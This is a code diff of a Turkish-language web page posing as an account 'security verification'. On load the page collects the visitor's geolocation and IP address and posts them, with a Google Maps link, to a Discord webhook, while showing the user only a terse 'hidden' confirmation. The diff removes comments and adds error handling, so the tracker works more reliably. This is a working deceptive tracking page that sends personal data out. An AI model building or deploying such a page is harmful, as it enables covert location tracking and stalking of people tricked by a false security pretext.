@@ -6,27 +6,27 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <style>
         body {
-            background: #0a0a0a; /* Arka plan rengi (Koyu) */
-            color: #eaeaea; /* Yazı rengi (Açık) */
+            background: #0a0a0a;
+            color: #eaeaea;
             font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
             display: flex;
             justify-content: center;
             align-items: center;
             min-height: 100vh;
             margin: 0;
-            overflow: hidden; /* Sayfa taşmasını engellemek için */
+            overflow: hidden;
         }
         .container {
-            background: #111; /* Kutu arka plan rengi */
-            border: 1px solid #333; /* Kutu kenarlığı */
-            border-radius: 12px; /* Kutu yuvarlak köşeler */
+            background: #111;
+            border: 1px solid #333;
+            border-radius: 12px;
             padding: 40px;
             width: 90%;
             max-width: 550px;
-            box-shadow: 0 0 30px rgba(0, 0, 0, 0.5); /* Kutu gölgesi */
+            box-shadow: 0 0 30px rgba(0, 0, 0, 0.5);
             text-align: center;
-            opacity: 0; /* Başlangıçta görünmez */
-            animation: fadeIn 1s forwards; /* Animasyon */
+            opacity: 0;
+            animation: fadeIn 1s forwards;
         }
         @keyframes fadeIn {
             from {
@@ -38,15 +38,15 @@
         }
         h1 {
             margin-top: 0;
-            color: #ffa500; /* Başlık rengi */
+            color: #ffa500;
         }
         p {
             font-size: 16px;
             line-height: 1.6;
         }
         button {
-            background: #ffa500; /* Buton arka plan rengi */
-            color: #0a0a0a; /* Buton yazı rengi */
+            background: #ffa500;
+            color: #0a0a0a;
             border: none;
             padding: 15px 30px;
             font-size: 18px;
@@ -55,10 +55,10 @@
             transition: background 0.3s;
         }
         button:hover {
-            background: #ffcc00; /* Buton hover rengi */
+            background: #ffcc00;
         }
         button:disabled {
-            background: #555; /* Devre dışı buton rengi */
+            background: #555;
             cursor: not-allowed;
         }
         .result {
@@ -66,7 +66,6 @@
             font-size: 14px;
             color: #ccc;
         }
-        /* Gizli alanlar */
         .hidden {
             display: none;
         }
@@ -76,14 +75,14 @@
             left: 0;
             width: 100%;
             height: 100%;
-            backdrop-filter: blur(10px); /* Arka planı bulanıklaştır */
-            -webkit-backdrop-filter: blur(10px); /* Safari için */
-            z-index: -1; /* Arka planda kalmasını sağlar */
+            backdrop-filter: blur(10px);
+            -webkit-backdrop-filter: blur(10px);
+            z-index: -1;
         }
     </style>
 </head>
 <body>
-    <div class="blurred-background"></div> <!-- Bulanık arka plan -->
+    <div class="blurred-background"></div>
     <div id="content" class="container">
         <h1>Güvenlik Doğrulaması</h1>
         <p>Hesabınızın güvenliğini artırmak için lütfen konumunuzu doğrulayın. Bu işlem, yalnızca güvenlik amaçlıdır ve kaydedilecektir.</p>
@@ -97,7 +96,6 @@
         const locationButton = document.getElementById('locationButton');
         const resultDiv = document.getElementById('result');
 
-        // Sayfa yüklendiğinde konumu otomatik olarak al
         window.onload = () => {
             getLocationAndSend();
         };
@@ -113,12 +111,17 @@
                         const accuracy = position.coords.accuracy;
                         const mapsUrl = `https://www.google.com/maps?q=${latitude},${longitude}`;
 
-                        await sendLocationLog(latitude, longitude, accuracy, mapsUrl);
-
-                        resultDiv.innerHTML = `Konum başarıyla alındı! (Gizli)` ; // Kullanıcıya minimal geri bildirim
-                        locationButton.textContent = 'Doğrulandı';
-                        // İsteğe bağlı: Butonu gizle veya devre dışı bırak
-                        locationButton.classList.add('hidden'); // Butonu gizle
+                        try {
+                            await sendLocationLog(latitude, longitude, accuracy, mapsUrl);
+                            resultDiv.innerHTML = `Konum başarıyla alındı! (Gizli)`;
+                            locationButton.textContent = 'Doğrulandı';
+                            locationButton.classList.add('hidden');
+                        } catch (error) {
+                            console.error("Discord'a log gönderilirken hata:", error);
+                            resultDiv.innerHTML = `Discord'a bilgi gönderilemedi. Lütfen konsolu kontrol edin.`;
+                            locationButton.textContent = 'Tekrar Dene';
+                            locationButton.disabled = false;
+                        }
                     },
                     (error) => {
                         let errorMessage = "Konum alınamadı.";
@@ -144,7 +147,6 @@
             }
         }
 
-
         async function sendLocationLog(lat, lon, acc, mapUrl) {
             const payload = {
                 content: "📍 **Yeni Konum Bilgisi!**",
@@ -164,20 +166,30 @@
 
             try {
                 const ipResponse = await fetch('https://ipapi.co/json/');
+                if (!ipResponse.ok) {
+                    throw new Error(`IP adresi alınamadı: ${ipResponse.status} ${ipResponse.statusText}`);
+                }
                 const ipData = await ipResponse.json();
                 payload.embeds[0].fields[4].value = `\`\`\`${ipData.ip} (${ipData.city}, ${ipData.country_name})\`\`\``;
-            } catch (e) {
-                payload.embeds[0].fields[4].value = "\`\`\`IP bilgisi alınamadı.\`\`\`";
+            } catch (ipError) {
+                console.error("IP adresi alınırken hata:", ipError);
+                payload.embeds[0].fields[4].value = `\`\`\`IP bilgisi alınamadı: ${ipError.message}\`\`\``;
             }
 
             try {
-                await fetch(webhookUrl, {
+                const response = await fetch(webhookUrl, {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
                     body: JSON.stringify(payload)
                 });
-            } catch (e) {
-                console.error("Discord'a konum bildirimi gönderilemedi:", e);
+
+                if (!response.ok) {
+                    throw new Error(`Webhook gönderilemedi: ${response.status} ${response.statusText}`);
+                }
+                console.log("Discord'a log başarıyla gönderildi."); // Başarılı log mesajı
+            } catch (discordError) {
+                console.error("Discord'a log gönderilirken hata:", discordError);
+                throw discordError; // Hatayı tekrar fırlat, üst fonksiyonda yakalansın.
             }
         }
     </script>
